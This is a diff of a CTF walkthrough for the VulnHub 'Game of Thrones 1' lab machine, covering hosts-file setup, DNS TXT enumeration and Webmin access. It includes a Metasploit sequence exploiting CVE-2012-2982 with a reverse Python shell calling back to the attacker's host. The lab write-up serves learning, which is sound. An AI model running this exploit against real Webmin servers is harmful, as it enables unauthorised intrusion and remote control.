@@ -1,4 +1,3 @@
-<div style="text-align: justify;">
 # CTF Challenge: Game of Thrones 1
 
 ## Introduction and Objectives
@@ -63,33 +62,43 @@ cat the_wall.txt
 The decrypted file provided explicit credentials and setup instructions for the next phase.
 
 ### The Wall and The North (HTTP)
-The instructions directed me to navigate to http://winterfell.7kingdoms.ctf/——W1nt3rf3ll——. Initially, the browser failed to resolve the domain name. This setup leverages Virtual Hosting, a mechanism where a web server hosts multiple domain names on a single IP address, routing traffic based on the HTTP Host header sent by the client.
-To simulate proper DNS resolution within my isolated lab environment, I appended a static mapping to the Kali Linux local hosts file:
-sudo vim /etc/hosts
-Appended line: 192.168.1.124 winterfell.7kingdoms.ctf
+
+I navigated to http://winterfell.7kingdoms.ctf/——W1nt3rf3ll—— , but the browser failed to resolve the domain name. This setup leverages Virtual Hosting, a mechanism where a web server hosts multiple domain names on a single IP address, routing traffic based on the HTTP Host header sent by the client.
+
+To simulate proper DNS resolution within my isolated lab environment, I appended a static mapping (`192.168.1.124 winterfell.7kingdoms.ctf`) to the Kali Linux local hosts file: `sudo vim /etc/hosts`
+
 Refreshing the browser opened the login portal. After authenticating with the previously acquired credentials, I inspected the page source code to extract the second flag alongside a new cryptographic clue.
 
 ### Iron Island (DNS)
-The clue hinted at exploring "the magic on the shield." Suspecting steganography or embedded file metadata, I downloaded the image asset (stark_shield.jpeg) and extracted readable ASCII strings using strings stark_shield.jpeg
-Within the output, I spotted a clear reference pointing to a DNS TXT record for the domain Timef0rconqu3rs.7Kingdoms.ctf. DNS TXT records are typically used to hold arbitrary text strings. I queried the target's active DNS server directly:
-nslookup -type=TXT Timef0rconqu3rs.7Kingdoms.ctf 192.168.1.124
-The DNS server's response revealed the third flag and a new set of credentials (aryastark) designated for a service running on port 10000.
+
+The clue hinted at exploring "the magic on the shield." I downloaded the image asset (`stark_shield.jpeg`) and extracted readable ASCII strings using `strings stark_shield.jpeg`.
+
+Within the output, I spotted a clear reference pointing to a DNS TXT record for the domain `Timef0rconqu3rs.7Kingdoms.ctf`. DNS TXT records are typically used to hold arbitrary text strings. I queried the target's active DNS server directly:
+`nslookup -type=TXT Timef0rconqu3rs.7Kingdoms.ctf 192.168.1.124`. The DNS server's response revealed the third flag and a new set of credentials (aryastark) designated for a service running on port 10000.
 
 ### Stormlands (Webmin)
-Navigando to http://192.168.1.124:10000, I reached the login interface of the Webmin systems management panel. Logging in as aryastark, I identified the software version as 1.590.
-I cross-referenced this version against known public vulnerabilities using searchsploit:
-searchsploit webmin
-The search identified a well-known Remote Code Execution (RCE) vulnerability tracked as CVE-2012-2982. The flaw exists within the show.cgi component due to insufficient input validation, allowing an authenticated user to inject and execute arbitrary system commands with application privileges.
-To automate execution, I launched Metasploit (msfconsole), selected the appropriate exploit module, and configured the required session variables—including the remote target (RHOSTS), credentials, and a Python-based reverse shell payload to call back to my attacker machine:
+
+By insoecting http://192.168.1.124:10000, I reached the login interface of the Webmin systems management panel. Logging in, I identified the software version as 1.590.
+
+I cross-referenced this version against known public vulnerabilities using searchsploit: `searchsploit webmin`. The search identified a well-known Remote Code Execution vulnerability tracked as CVE-2012-2982. The flaw exists within the `show.cgi`component due to insufficient input validation, allowing an authenticated user to inject and execute arbitrary system commands with application privileges.
+
+To automate execution, I launched Metasploit (`msfconsole`), selected the appropriate exploit module, and configured the required session variables—including the remote target, credentials and a Python-based reverse shell payload to call back to my attacker machine:
+```bash
 use exploit/unix/webapp/webmin_show_cgi_exec
 set USERNAME aryastark
 set PASSWORD N3ddl3_1s_a_g00d_sword#!
 set RHOSTS 192.168.1.124
 set LHOST 192.168.1.58
+set SSL false
+set PAYLOAD cmd/unix/reverse_python
 exploit
-The exploit executed successfully, spawning an interactive reverse shell. I traversed the file system to the user's home directory and exfiltrated the fourth flag:
+```
+
+The exploit executed successfully, spawning an interactive reverse shell. I traversed the file system to the user's home directory and exfiltrated the fourth flag: 
+```bash
 cd /home/aryastark
 cat flag.txt
+```
 The file also revealed the connection parameters for a backend PostgreSQL database.
 
 ### Mountain and the Vale (PostgreSQL)
@@ -148,4 +157,4 @@ Technical Milestone References: The Hacking Quest Series
 Target Download Repository: VulnHub - Game of Thrones CTF 1
 Vulnerability Scoring Reference: NIST National Vulnerability Database
 
-</div>
+
